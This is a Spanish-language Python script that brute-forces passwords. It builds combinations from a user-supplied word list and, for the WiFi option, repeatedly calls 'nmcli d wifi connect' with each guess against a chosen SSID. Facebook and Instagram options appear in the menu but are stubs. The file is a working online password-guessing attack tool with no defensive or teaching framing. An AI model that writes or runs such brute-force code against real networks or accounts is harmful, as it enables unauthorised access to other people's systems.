#!/bin/python3.7
import os
import pyautogui as pg
import time as tm

diccionario = [" "]

def cracker(action):
    posibilidades = []
    intento = ""
    pwd="simple_text_example"
    
    if action == "posibilidades":

        for c1 in diccionario:
            if intento != pwd:
                for c2 in diccionario:
                    if intento != pwd:
                        for c3 in diccionario:
                            if intento != pwd:
                                for c4 in diccionario:
                                    if intento != pwd:
                                        for c5 in diccionario:
                                            if intento != pwd:
                                                for c6 in diccionario:
                                                    if intento != pwd:
                                                        for c7 in diccionario:
                                                            cc = c1+c2+c3+c4+c5+c6+c7
                                                            intento = cc.strip()
                                                            posibilidades.append(intento)
                                                    else:
                                                        break
                                            else:
                                                break
                                    else:
                                        break
                            else:
                                break
                    else:
                        break
            else:
                break        
        print("Posibilidades : "+str(len(posibilidades)))
        tiempo = len(posibilidades)*8
        if tiempo > 3600:
            tiempo = tiempo/3600
            print("Tiempo Estimado : "+str(tiempo)+"horas")
        else:
            print("Tiempo Estimado : "+str(tiempo)+"segundos")
        v_attack = input("Deseas continuar??[y/n] ")
        if v_attack == "y" or v_attack == "Y":
            cracker("attack")

    elif action == "attack":
        for c1 in diccionario:
            if intento != pwd:
                for c2 in diccionario:
                    if intento != pwd:
                        for c3 in diccionario:
                            if intento != pwd:
                                for c4 in diccionario:
                                    if intento != pwd:
                                        for c5 in diccionario:
                                            if intento != pwd:
                                                for c6 in diccionario:
                                                    if intento != pwd:
                                                        for c7 in diccionario:
                                                            cc = c1+c2+c3+c4+c5+c6+c7
                                                            intento = cc.strip()
                                                            if entorno == "1":
                                                                print("[-] Funcion no desarrollada... :(")
                                                            elif entorno == "2":
                                                                print("[-] Funcion no desarrollada... :(")
                                                            elif entorno == "3":
                                                                os.system('nmcli d wifi connect '+essid+' password '+intento)
                                                    else:
                                                        break
                                            else:
                                                break
                                    else:
                                        break
                            else:
                                break
                    else:
                        break
            else:
                break
def init_hack(diccionario):
    print("[1] Facebook     [2] Instagram\n[3] Red Wifi")
    global entorno
    entorno = input(">> ")
    if entorno == "1":
        print("[-] Funcion no desarrollada... :(")
    elif entorno == "2":
        print("[-] Funcion no desarrollada... :(")
    elif entorno == "3":
        global essid
        essid = input("SSID >> ")
    cracker("posibilidades")      

def init_program():
    print("\n[0] Cancel   [1] Add   [2] Del   [3] Show   [4] Confirm")
    action = input(">>")
    if action == "0":
        exit()
    elif action == "1":
        obj_diccionario = input("Añadir >> ")
        objects = obj_diccionario.split(' ')
        for obj_diccionario in objects:
            diccionario.append(obj_diccionario)
        init_program()
    elif action == "2":
        obj_diccionario = input("Eliminar >> ")
        diccionario.remove(obj_diccionario)
        init_program()
    elif action == "3":
        for a in range(0, len(diccionario)):
            print("["+str(a)+"] "+diccionario[a])
        init_program()
    elif action == "4":
        init_hack(diccionario)
    else:
        print("[-] Err: Opcion no existe.")
        init_program()
os.system('clear')
init_program()